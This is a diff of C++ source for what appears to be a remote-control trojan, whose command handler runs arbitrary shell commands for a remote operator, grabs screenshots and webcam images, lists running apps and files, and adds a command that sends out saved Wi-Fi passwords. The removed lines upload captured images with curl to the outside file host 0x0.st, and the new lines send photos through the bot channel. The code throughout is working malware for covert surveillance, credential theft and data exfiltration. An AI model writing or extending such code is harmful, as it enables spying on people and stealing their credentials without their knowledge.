@@ -10,7 +10,7 @@ void commands(string command, string parameters) {
 	}
 	else if (command == "cmd") {
 		Send(exec(parameters.c_str()));
-		system(parameters.c_str());
+		//system(parameters.c_str());
 	}
 	else if (command == "SetCursor") {
 		string x = "", y;
@@ -133,13 +133,9 @@ void commands(string command, string parameters) {
 		// save img
 		imwrite("ss.jpg", src);
 
-		string l = "curl -F file=@" + path + " https://0x0.st -o buff.jd";
-		system(l.c_str()); l.clear();
-		fstream file; file.open("buff.jd", ios::in); file >> l;
-		Send(l);
-		string buff = get_path() + "buff.jd";
-		remove(buff.c_str());
-		remove(path.c_str());
+		SendPhoto(path);
+		string s = "del " + path;
+		system(s.c_str());
 		done = false;
 	}
 	else if (command == "msgbox") { //"Text",number,"Title"
@@ -154,7 +150,7 @@ void commands(string command, string parameters) {
 		file.close();
 		system("start msg.vbs");
 		Sleep(1000);
-		remove("msg.vbs");
+		Remove("msg.vbs");
 
 	}
 	else if (command == "Hotkey") {
@@ -226,25 +222,32 @@ void commands(string command, string parameters) {
 		}
 		// Save the frame into a file
 		imwrite("wcm.jpg", save_img); // A JPG FILE IS BEING SAVED
-
-
 		string path = get_path() + "wcm.jpg";
 
-
-		string l = "curl -F file=@" + path + " https://0x0.st -o buff.jd";
-		system(l.c_str()); l.clear();
-		fstream file; file.open("buff.jd", ios::in); file >> l;
-		Send(l);
-		string buff = get_path() + "buff.jd";
-		remove(buff.c_str());
-		remove(path.c_str());
-
+		SendPhoto(path);
+		string s = "del " + path;
+		system(s.c_str());
+		done = false;
 	}
 	else if (command == "Sleep") {
 		Sleep(atoi(parameters.c_str()) * 1000);
 	}
 	else if (command == "ErrorSound") {
 		MessageBeep(1);
+	}
+	else if (command == "RunningApps") {
+	string s = exec("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName");
+		Send(s.substr(42,s.size()).c_str());
+		done = false;
+	}
+	else if (command == "ListOfFiles") {
+		if (parameters == "NULL")return;
+		Send(ListOfFiles(parameters));
+		done = false;
+	}
+	else if (command == "WifiList") {
+		Send(get_ListOfWifiPasswords());
+		done = false;
 	}
 	else {
 		Send("Command not found, use <ID> help to check list of all commands");
